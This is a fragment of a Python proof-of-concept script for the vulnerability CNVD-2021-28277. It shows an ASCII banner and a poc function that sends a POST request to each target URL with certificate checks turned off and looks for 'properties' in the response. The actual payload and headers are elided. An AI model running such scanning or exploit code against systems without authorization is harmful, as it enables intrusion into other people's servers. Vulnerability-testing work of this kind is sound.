...
def banner():
    test = """
   ___     __         ___     ____   ___ ____  _      ____  ___ ____ _____ _____ 
  / __\ /\ \ \/\   /\/   \   |___ \ / _ \___ \/ |    |___ \( _ )___ \___  |___  |
 / /   /  \/ /\ \ / / /\ /____ __) | | | |__) | |_____ __) / _ \ __) | / /   / / 
/ /___/ /\  /  \ V / /_//_____/ __/| |_| / __/| |_____/ __/ (_) / __/ / /   / /  
\____/\_\ \/    \_/___,'     |_____|\___/_____|_|    |_____\___/_____/_/   /_/   
                                                                                 """
    print(test)
...
def poc(target, output_file):
    ...
    try:
        res = requests.post(
            url=target + payload, headers=headers, data=data, timeout=6, verify=False
        )

        if "properties" in res.text:
